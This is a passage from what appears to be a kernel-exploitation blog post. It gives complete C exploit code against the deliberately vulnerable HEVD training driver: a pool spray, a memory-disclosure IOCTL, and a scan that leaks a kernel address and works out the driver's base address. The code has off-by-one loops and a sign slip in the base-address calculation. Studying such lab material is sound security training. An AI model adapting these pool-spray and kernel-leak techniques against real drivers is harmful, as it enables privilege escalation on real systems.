#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x0022204f
#define IOCTL_UAF 0x00222053

/* Function to open a handle to the driver */
HANDLE OpenDriverHandle(void)
{
    HANDLE DriverHandle = NULL;

    /* Opens handle to driver */
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) // If handle cant open, exit.
    {
        printf("\t[!] FATAL: Failed to open driver handle!\n");
        exit(-1);
    }
    else
    {
        printf("\t[+] Opened Driver Handle: 0x%x\n", DriverHandle);
        return DriverHandle; // Return handle to driver to be used later.
    }
}

void PoolSpray(HANDLE DriverHandle)
{
    HANDLE  EventObjects[5000] = {0};
    DWORD   BytesReturned;

    /* Spray 10,000 Event Objects and 10,000 UAF Objects */
    for (int i = 0; i <= 5000; i++)
    {
        HANDLE EventHandle = CreateEventA(NULL, FALSE, FALSE, NULL);
        EventObjects[i] = EventHandle;

        DeviceIoControl(DriverHandle, IOCTL_UAF, NULL, 0, NULL, 0, &BytesReturned, NULL);
    }
    //DeviceIoControl(DriverHandle, IOCTL_UAF, NULL, 0, NULL, 0, &BytesReturned, NULL);

    /* Free event objects */
    for (int i = 0; i <= 5000; i++)
    {
        CloseHandle(EventObjects[i]);
        EventObjects[i] = NULL;
    }
}

void exploit(HANDLE DriverHandle)
{
    DWORD           BytesReturned;
    char            OutputBuffer[0x270] = {0};
    ULONGLONG       HevdBaseAddress;

    char search[5] = "Hack";
    int pos_search = 0;
    int pos_text = 0;
    int len_search = 4;
    int len_text = 0x270;
    BOOL Match = FALSE;

    printf("[+] Starting pool spray!\n");
    for (int i = 0; i <= 100; i++)
    {
        PoolSpray(DriverHandle);
        DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &OutputBuffer, sizeof(OutputBuffer), &BytesReturned, NULL);

        for (pos_text = 0; pos_text < len_text - len_search; ++pos_text)
        {
            if (OutputBuffer[pos_text] == search[pos_search])
            {
                ++pos_search;
                if (pos_search == len_search)
                {
                    printf("\t[!] Match from %d to %d\n", pos_text-len_search, pos_text);
                    Match = TRUE;
                    break;
                }
            }
            else
            {
                pos_text -= pos_search;
                pos_search = 0;
            }
        }

        if (Match == TRUE)
        {
            for (int i = 0; i <= 0x270; i++)
            {
                unsigned long long *UOutputBuffer;
                UOutputBuffer = (unsigned long long *)OutputBuffer;
                //printf("0x%llx\n", UOutputBuffer[i]);

                /* Check if we leaked kernel address */
                if ((UOutputBuffer[i] & 0xfffff00000000000) == 0xfffff00000000000)
                {
                    printf("\t[+] Address of HEVD!UaFObjectCallback: 0x%llx\n", UOutputBuffer[i]);
                    printf("\t[+] Base Address of HEVD: 0x%llx\n", UOutputBuffer[i] - 0x880C0);

                    // 0: kd> ? 0xfffff8051b3880c0 - HEVD
                    // Evaluate expression: 557248 = 00000000`000880c0
                    HevdBaseAddress = UOutputBuffer[i] + 0x880C0;
                    break;
                }
            }
            break;
        }
    }
    printf("[*] Closing handle!\n");
    CloseHandle(DriverHandle);
}

int main()
{
    printf("[+] HEVD: NonPagedPoolNx Memory Disclosure!\n");

    printf("[*] Opening handle to the driver!\n");
    HANDLE DriverHandle = OpenDriverHandle();

    exploit(DriverHandle);
}
```

[Exploit on :fontawesome-brands-github: ](https://github.com/LinxzSec/Kernel-Exploits/blob/main/HEVD/NonPagedPoolNxMemoryDisclosure.c){.md-button .md-button--primary }

<hr>

# Acknowledgements

Thanks to myself for putting up with myself trying lots of very dumb ideas.

<hr>

# References

- [1] - [https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol)
- [2] - [https://stackoverflow.com/questions/13450809/how-to-search-a-string-in-a-char-array-in-c](https://stackoverflow.com/questions/13450809/how-to-search-a-string-in-a-char-array-in-c)
- [3] = [https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.c](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.c)

--8<-- "includes/abbreviations.md"